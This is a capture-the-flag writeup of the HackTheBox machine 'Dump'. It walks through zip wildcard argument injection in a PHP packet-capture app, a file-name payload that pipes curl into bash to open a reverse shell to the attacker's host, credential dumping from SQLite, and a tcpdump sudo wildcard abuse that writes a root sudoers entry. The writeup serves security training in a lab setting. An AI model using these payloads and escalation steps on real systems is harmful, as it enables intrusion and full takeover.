---
title: 'HackTheBox | Dump'
published: 2026-10-9
draft: false
description: 'HackTheBox Machine `Dump` writeup.'
tags: ['HackTheBox', 'linux', 'wildcard-injection', 'argument-injection']
---

## Recon

### Port Scan

```
# Nmap 7.95 scan initiated Wed Oct  7 02:59:18 2026 as: nmap -sC -sV -p22,80,5228,11878,27076,28925,40856,41028,41687,48680,51156,56079,65127 -Pn -n -vv -oN nmap/tcp_deep 10.129.234.97
Nmap scan report for 10.129.234.97
Host is up, received user-set (0.23s latency).
Scanned at 2026-10-07 02:59:18 EDT for 14s

PORT      STATE  SERVICE REASON       VERSION
22/tcp    open   ssh     syn-ack      OpenSSH 8.4p1 Debian 5+deb11u5 (protocol 2.0)
| ssh-hostkey:
|   3072 fb:31:61:8d:2f:86:e5:60:f9:e6:24:a3:1c:62:0c:ae (RSA)
| ssh-rsa
<SNIP>
NliIJkvVXM9UclXNlvaVGgqmWhP6Jy7nW+/Z0jbr3mm9WO2V7AOK4OPpc=
|   256 0c:b7:c4:fb:4a:fc:31:1b:e9:4b:0b:d1:19:56:2f:ce (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH4w3KT2z1Vq9nBl722wyo7w8y5JQKDLRi4qPvHSQKfBROk377VWCyz92CC2rHn0u7vCkdMtNLvz1aEckiP6Esc=
|   256 3c:c6:e8:71:4d:9a:d5:1d:86:dd:dd:6c:82:ee:7e:4d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAO3KMJ1iNSmh6C+bSJSua10jxEVhpjruu0mtVpsgxo6
80/tcp    open   http    syn-ack      Apache httpd 2.4.65 ((Debian))
|_http-title: hdmpll?
|_http-server-header: Apache/2.4.65 (Debian)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Oct  7 02:59:32 2026 -- 1 IP address (1 host up) scanned in 14.36 seconds
```

**Nmap finds two open ports: 22 (SSH) and 80 (HTTP).**

### HTTP @80

- The website is titled **`hdmpll?`** (→ "How Do My Packets Look Like?").
- The home page `/index.php` presents a Login and Register form, requiring just two fields: **username** and **password**.
- The app offers the following functionality:
  - **`Capture Traffic`**
  - **`Download Captures`**
  - **`Upload Captures`**

#### Tech Stack

```
Language - PHP
Server - Apache 2.4.65
OS - Debian
```

#### Directory Bruteforce

A directory bruteforce highlights the following pages; there are no hidden pages.

```shell
$ cat Web/dirbrute.ffuf | jq .results[].input.FUZZ
"logout.php"
"download.php"
"downloads"
"upload.php"
"index.php"
"view.php"
"delete.php"
"server-status"
"capture.php"
```

#### `Capture Traffic` button

- This button redirects to `/capture.php`, and the page starts capturing incoming traffic on a random port using the `tcpdump` binary, for 10 seconds, with a maximum of 10 packets.
- Using `tcpdump`, it writes output to a filename of the format `UUID`. It's a `pcap` file.
- A request to **`/view.php?fn=<uuid>`** will show the captured packets.
- The query param in the `view.php` page only accepts a format of `UUID`, i.e., `8-4-4-4-12`.
- `/index.php` will then show a list of all `pcaps`.

#### `Upload Captures` button

- This button sends an HTTP POST request to `/upload.php`, allowing users to upload a file to the server.
- The uploaded file name can be anything; there are no checks in place. But to view the file, the name must follow the same format as before, i.e., `UUID`.
- There are no checks on the `Content-Type` header or the file content either.

#### `Download Captures` button

- This button lets a user download all of their files, compressed into a zip file named with a random UUID.
- The app compresses all the files (captured or uploaded) into a zip and places it under the `/downloads/` directory.
- If there are no files, the zip is not created, and the next request returns a 404 error.
- A response to this page looks like this:

```http
HTTP/1.1 301 Moved Permanently
Date: Wed, 07 Oct 2026 07:30:51 GMT
Server: Apache/2.4.65 (Debian)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: downloads/32550f10-0252-4609-8b5c-9702f2f407c9.zip
Content-Length: 92
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

Preparing download...
<!--
  adding: b6bbf66d-7a8a-44e0-b9b8-d983f982e3a7 (deflated 33%)
-->
```

- From the _comment_ in the response, it's clear the app is using the Linux `zip` utility to compress the files.

#### `Delete` button

- This button lets users `delete` an uploaded or captured file.
- It accepts a query param `fn`, but there are no checks on it. It can accept any value.

---

## Exploitation

### Getting a Foothold - `zip` Utility Wildcard Exploitation

- The `zip` utility has the `-r` flag, which is the intended way to zip all files in a directory.
- But sometimes developers use wildcards (`*`) to select all files instead.
- If the filenames inside the directory can be arbitrary, this opens up a vector for **argument injection**, and potentially, **command injection**.

#### Local Testing

- To test this locally, I'll first create 2 empty files: `file1.txt` and `file2.txt`.

```shell
$ ls
file1.txt  file2.txt
```

- If the web app is vulnerable, it would implement it in the following way:

```shell
$ cd user_dir
$ zip [UUID].zip *
```

- Next, I'll create a file with a name that corresponds to one of the **arguments** of the `zip` binary, `-h2` for example.

```shell
$ echo "" > "-h2"
$ ls
file1.txt  file2.txt  -h2
```

- Now, if I try to create a zip file the same way as before, I'll see the result of the `-h2` argument.

```shell
$ zip file.zip *

Extended Help for Zip

See the Zip Manual for more detailed help


Zip stores files in zip archives.  The default action is to add or replace
zipfile entries.

Basic command line:
  zip options archive_name file file ...

Some examples:
  Add file.txt to z.zip (create z if needed):      zip z file.txt
  Zip all files in current dir:                    zip z *
  Zip files in current dir and subdirs also:       zip -r z .

Basic modes:
<SNIP>
```

---

#### Confirming on the Website

- Since I can upload a file with any name and extension, I'll upload one named `-h2`, a simple text file.
- The command to create a zip is triggered when visiting or clicking the `Download Captures` button.
- I'll click it and look at the response from the web server, which shows that the app is indeed vulnerable.

```http
HTTP/1.1 301 Moved Permanently
Date: Wed, 07 Oct 2026 07:30:51 GMT
Server: Apache/2.4.65 (Debian)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: downloads/32550f10-0252-4609-8b5c-9702f2f407c9.zip
Content-Length: 92
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

Preparing download...
<!--
  Extended Help for Zip

	See the Zip Manual for more detailed help
	<SNIP>
-->
```

---

## From Argument Injection to Command Injection - Shell as `www-data`

- A bit of searching for "zip utility wildcard injection" turned up this [page](https://sonarsource.github.io/argument-injection-vectors/binaries/zip/).
- It uses the `-T` argument, which is used to _test_ the created archive, and `-TT` to specify a custom command to run during the test.
- First, I'll confirm the command injection using `sleep 5` and `sleep 10` commands.
- I'll upload a file named `-TmTT="$(sleep 5)foooo".zip`.
- On clicking the `Download Captures` button, the response is delayed by 5 seconds, confirming the command injection.

**Here's how I got a reverse shell back:**

- First, I crafted an `HTTP` response containing a reverse shell command.

```http
HTTP/1.1 200 OK
Date: Wed, 07 Oct 2026 10:45:15 GMT
Server: Apache/2.4.65 (Debian)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 52
Keep-Alive: timeout=5, max=100
Connection: Close
Content-Type: text/html; charset=UTF-8

bash -c "bash -i >& /dev/tcp/10.10.16.51/9003 0>&1"
```

- Next, I'll start a listener using `NetCat` that will send this response to any connections it receives.

```shell
sudo nc -lnvp 80 -q 0 < shell
```

- Then I'll upload a file with the following name:

```
-TmTT="$(curl 10.10.16.51|bash)foooo".zip
```

- On clicking the download button, I'll receive a shell back as **`www-data`**.

---

## Lateral Movement - Dumping SQLite DB

- In the web app directory, there's a SQLite database named `database.sqlite3`.
- I'll dump it and find the cleartext credentials for the user `fritz`.

```shell
$ sqlite3 database.sqlite3 .dump
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE users (username varchar(255) primary key not null, password varchar(255) not null, guid varchar(36) not null);
INSERT INTO users VALUES('fritz','Passw0rdH4shingIsforNoobZ!','534ce8b9-6a77-4113-a8c1-66462519bfd1');
INSERT INTO users VALUES('conner','password','21585d0f-1fe3-4556-8beb-d08fc927d7d5');
INSERT INTO users VALUES('conner1','password','95000d69-0379-44e8-be5d-3b4e958a18e0');
COMMIT;
```

- I can now SSH in as `fritz`.

---

## Privilege Escalation - Exploiting `tcpdump` Wildcard Injection

- `tcpdump` is a sensitive binary that needs privileged _capabilities_ or sudo privileges to run.
- The user `www-data` has the necessary sudo privileges to start capturing packets.

```shell
www-data@dump:/var/www$ sudo -l
Matching Defaults entries for www-data on dump:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on dump:
    (ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10
        -w/var/cache/captures/*/[0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f]-[0-9a-f][0-9a-f][0-9a-f][0-9a-f]-[0-9a-f][0-9a-f][0-9a-f][0-9a-f]-[0-9a-f][0-9a-f][0-9a-f][0-9a-f]-[0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f]
        -F/var/cache/captures/filter.[0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f]-[0-9a-f][0-9a-f][0-9a-f][0-9a-f]-[0-9a-f][0-9a-f][0-9a-f][0-9a-f]-[0-9a-f][0-9a-f][0-9a-f][0-9a-f]-[0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f]
```

- Basically, it checks for the following syntax:

```shell
$ /usr/bin/tcpdump -c10 -w/var/cache/captures/*/[UUID] -F/var/cache/captures/filter.[UUID]
```

```
- `-c`: capture 10 packets
- `-w`: write to a file
- `-F`: filter using filters in the specified file
```

- It also requires no password to run this command.

### Argument Injection Using a Wildcard (`*`)

- With a wildcard in a Linux command, anything can be injected unless it's a **command terminator**, like `;`, `\n`, or `|`.
- A `<space>` is not a command terminator, and it lets an attacker inject additional arguments into a command.
- I can inject `../` into the wildcard to change the directory where the file will be created, but I cannot change the filename to anything else; it can only be in the format of a `UUID`.
- I can also inject the `-Z root` argument, which specifies the user ID the process runs as.
- By exploiting this, I get a **file write** as the **root** user.

### Adding a `sudoers` Entry for the `fritz` User

- The file created by `tcpdump` would not be entirely clean, text-only content, but it would be enough to add a `sudoers` entry in the `/etc/sudoers.d/` directory.
- I'll run the `tcpdump` command with the injected arguments to create a file inside the `sudoers.d` directory.

```shell
www-data@dump:/var/www$ sudo /usr/bin/tcpdump -c10 -w/var/cache/captures/../../../etc/sudoers.d/c1c4349c-5bc2-44d6-836f-bf245580cd8f -Z root /c1c4349c-5bc2-44d6-836f-bf245580cd8f -F/var/cache/captures/filter.c1c4349c-5bc2-44d6-836f-bf245580cd8f
```

- Before running the command, I'll create a file specifying the `sudoers` entry for the `fritz` user. The blank lines above and below are required.

```


fritz ALL=(ALL) NOPASSWD: ALL



```

- I'll use the `cat` command to send the file over UDP, to any port.

```shell
www-data@dump:/var/www$ cat fritz > /dev/udp/127.0.0.1/9001
```

- A file named `c1c4349c-5bc2-44d6-836f-bf245580cd8f` is created inside the `sudoers.d` directory, containing the entry for the `fritz` user twice.
- From the `fritz` user's SSH shell, I can use `sudo -i` to get a shell as `root`.
